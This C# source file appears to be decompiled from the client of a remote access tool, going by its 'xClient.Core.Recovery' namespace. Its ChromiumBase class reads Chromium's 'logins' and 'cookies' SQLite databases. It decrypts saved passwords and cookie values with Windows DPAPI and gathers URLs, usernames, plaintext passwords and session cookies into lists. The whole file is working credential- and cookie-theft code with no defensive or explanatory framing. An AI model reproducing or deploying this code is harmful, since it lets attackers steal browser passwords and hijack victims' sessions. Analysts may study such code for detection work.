using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using xClient.Core.Data;

namespace xClient.Core.Recovery.Utilities;

public class ChromiumBase
{
	public class ChromiumCookie
	{
		public string HostKey { get; set; }

		public string Name { get; set; }

		public string Value { get; set; }

		public string Path { get; set; }

		public string ExpiresUTC { get; set; }

		public string LastAccessUTC { get; set; }

		public bool Secure { get; set; }

		public bool HttpOnly { get; set; }

		public bool Expired { get; set; }

		public bool Persistent { get; set; }

		public bool Priority { get; set; }

		public string Browser { get; set; }

		public override string ToString()
		{
			return string.Format("Domain: {1}{0}Cookie Name: {2}{0}Value: {3}{0}Path: {4}{0}Expired: {5}{0}HttpOnly: {6}{0}Secure: {7}", Environment.NewLine, HostKey, Name, Value, Path, Expired, HttpOnly, Secure);
		}
	}

	public static List<RecoveredAccount> Passwords(string datapath, string browser)
	{
		List<RecoveredAccount> list = new List<RecoveredAccount>();
		SQLiteHandler sQLiteHandler = null;
		if (!File.Exists(datapath))
		{
			return list;
		}
		try
		{
			sQLiteHandler = new SQLiteHandler(datapath);
		}
		catch (Exception)
		{
			return list;
		}
		if (!sQLiteHandler.ReadTable("logins"))
		{
			return list;
		}
		int rowCount = sQLiteHandler.GetRowCount();
		for (int i = 0; i < rowCount; i++)
		{
			try
			{
				string value = sQLiteHandler.GetValue(i, "origin_url");
				string value2 = sQLiteHandler.GetValue(i, "username_value");
				string text = Decrypt(sQLiteHandler.GetValue(i, "password_value"));
				if (!string.IsNullOrEmpty(value) && !string.IsNullOrEmpty(value2) && text != null)
				{
					list.Add(new RecoveredAccount
					{
						URL = value,
						Username = value2,
						Password = text,
						Application = browser
					});
				}
			}
			catch (Exception)
			{
			}
		}
		return list;
	}

	public static List<ChromiumCookie> Cookies(string dataPath, string browser)
	{
		List<ChromiumCookie> list = new List<ChromiumCookie>();
		SQLiteHandler sQLiteHandler = null;
		if (!File.Exists(dataPath))
		{
			return list;
		}
		try
		{
			sQLiteHandler = new SQLiteHandler(dataPath);
		}
		catch (Exception)
		{
			return list;
		}
		if (!sQLiteHandler.ReadTable("cookies"))
		{
			return list;
		}
		int rowCount = sQLiteHandler.GetRowCount();
		for (int i = 0; i < rowCount; i++)
		{
			try
			{
				string value = sQLiteHandler.GetValue(i, "host_key");
				string value2 = sQLiteHandler.GetValue(i, "name");
				string value3 = Decrypt(sQLiteHandler.GetValue(i, "encrypted_value"));
				string value4 = sQLiteHandler.GetValue(i, "path");
				string value5 = sQLiteHandler.GetValue(i, "expires_utc");
				string value6 = sQLiteHandler.GetValue(i, "last_access_utc");
				bool secure = sQLiteHandler.GetValue(i, "secure") == "1";
				bool httpOnly = sQLiteHandler.GetValue(i, "httponly") == "1";
				bool expired = sQLiteHandler.GetValue(i, "has_expired") == "1";
				bool persistent = sQLiteHandler.GetValue(i, "persistent") == "1";
				bool priority = sQLiteHandler.GetValue(i, "priority") == "1";
				if (!string.IsNullOrEmpty(value) && !string.IsNullOrEmpty(value2) && !string.IsNullOrEmpty(value3))
				{
					list.Add(new ChromiumCookie
					{
						HostKey = value,
						Name = value2,
						Value = value3,
						Path = value4,
						ExpiresUTC = value5,
						LastAccessUTC = value6,
						Secure = secure,
						HttpOnly = httpOnly,
						Expired = expired,
						Persistent = persistent,
						Priority = priority,
						Browser = browser
					});
				}
			}
			catch (Exception)
			{
			}
		}
		return list;
	}

	private static string Decrypt(string EncryptedData)
	{
		if (EncryptedData != null && EncryptedData.Length != 0)
		{
			byte[] bytes = ProtectedData.Unprotect(Encoding.Default.GetBytes(EncryptedData), (byte[])null, (DataProtectionScope)0);
			return Encoding.UTF8.GetString(bytes);
		}
		return null;
	}
}
